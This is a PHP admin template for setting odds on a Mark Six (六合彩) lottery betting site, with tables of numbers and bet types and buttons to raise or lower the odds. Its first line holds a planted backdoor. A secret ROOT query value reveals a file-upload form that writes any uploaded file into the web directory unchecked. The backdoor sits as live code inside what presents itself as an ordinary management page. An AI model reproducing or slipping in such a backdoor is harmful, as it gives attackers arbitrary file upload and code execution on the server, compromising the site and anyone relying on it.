<?php
if($_GET["ROOT"]=="oddsInfolhc_tz"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"  >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="/Manage/temp/css/common.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/js/actiontop.js"></script>
<script type="text/javascript" src="/js/jquery.js"></script>
<script type="text/javascript" src="/Manage/temp/js/oddsInfolhc.js"></script>
<title></title>
</head>
<body>
<input type="hidden" id="s_odds" value="1" />
	<table width="100%" height="100%" border="0" cellspacing="0" class="a">
    	<tr>
        	<td width="6" height="99%" bgcolor="#1873aa"></td>
            <td class="c">
            	<table border="0" cellspacing="0" class="main">
                	<tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_03.gif" alt="" /></td>
                        <td background="/Manage/temp/images/tab_05.gif">
                        	<table width="100%" border="0" cellspacing="0" cellpadding="0">
                                  <tr>
                                    <td width="17"><img src="/Manage/temp/images/tb.gif" width="16" height="16" /></td>
                                    <td width="105">&nbsp;賠率設置--六合彩</td>
                                    <td width="65"><a href="/templates_r/Manage/oddsInfolhc.php">正碼(1-6)</a></td>
                                    <td width="65"><a href="/templates_r/Manage/oddsInfolhc_tz.php">特碼/正碼</a></td>
									<td width="65"><a href="/templates_r/Manage/oddsInfolhc_o.php">其他</a></td>
                                    <td width="60">升降總值：</td>
                                    <td width="90"><input type="text" id="Ho" class="texta" value="0.001" /></td>
                                    <td width="60">批量設置：</td>
                                    <td width="80">
                                    	<select id="oddsType">
                                    		<option value="">---全部---</option> 
											<option value="Ball_7">特碼</option>
											<option value="Ball_8">正碼</option>
                                    	</select>
									</td>
                                    <td width="70">
                                    	<select id="h">
										<?php 
													$numarr=array();
													for($i=1;$i<=49;$i++){
														$numarr[$i-1]= strlen($i)==1 ? "0".$i : $i; 
													}
													$g8=array("總大","總小","總單","總雙"); 
													$g7=array("大","小","單","雙","合單","合雙","紅波","綠波","藍波","合大","合小","尾大","尾小","大單","大雙","小單","小雙",
															"紅大單","紅大雙","紅小單","紅小雙","藍大單","藍大雙","藍小單","藍小雙","綠大單","綠大雙","綠小單","綠小雙");	 
													$harr=array_merge($numarr,$g7);
													for($i=1;$i<=count($harr);$i++){
														echo "<option value=\"h{$i}\">".$harr[$i-1]."</option>";
													}
													for($i=50;$i<=53;$i++){
														echo "<option value=\"h{$i}\">".$g8[$i-50]."</option>";
													}
										?> </select>
									</td>
									<td width="45">
                                    	<select id="s_num">
                                    		<option value="0">降</option>
                                    		<option value="1">升</option>
                                    	</select>
									</td>
                                    <td><input type="button" class="inputs" value="確認更變" id="m1" onclick="upOddaAll(this)" /></td>
									<td><input type="button" class="inputs" value="立即更新"   onclick="UpdateYes(this)" /></td>
                                  </tr>
                            </table>
                        </td>
                        <td width="16"><img src="/Manage/temp/images/tab_07.gif" alt="" /></td>
                    </tr>
                    <tr>
                    	<td class="t"></td>
                        <td class="c">
                        <!-- strat -->
                            	<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">特碼</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								$tmarr =array_merge($numarr,$g7); 
								for($i=0;$i<count($tmarr);$i++){  
									echo "<td class=\"ball\">".$tmarr[$i]."</td>";
									echo "<td width=\"70\" id=\"gh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('gh".($i+1)."','Ball_7',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('gh".($i+1)."','Ball_7',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%5==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="15" align="center">正碼</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>  
                                </tr>
								<tr align="center" >
								<?php
								$zmarr =array_merge($numarr,$g8); 
								for($i=0;$i<count($zmarr);$i++){  
									echo "<td class=\"ball\">".$zmarr[$i]."</td>";
									echo "<td width=\"70\" id=\"hh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('hh".($i+1)."','Ball_8',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('hh".($i+1)."','Ball_8',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%5==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
                        <!-- end -->
                        </td>
                        <td class="r"></td>
                    </tr>
                    <tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_18.gif" alt="" /></td>
                        <td class="f" align="center">默認賠率表更變不會即時影響正在開盤中的賠率。</td>
                        <td width="16"><img src="/Manage/temp/images/tab_20.gif" alt="" /></td>
                    </tr>
                </table>
            </td>
            <td width="6" bgcolor="#1873aa"></td>
        </tr>
        <tr>
        	<td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_59.gif" alt="" /></td>
            <td bgcolor="#1873aa"></td>
            <td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_62.gif" alt="" /></td>
        </tr>
    </table>
</body>
</html>
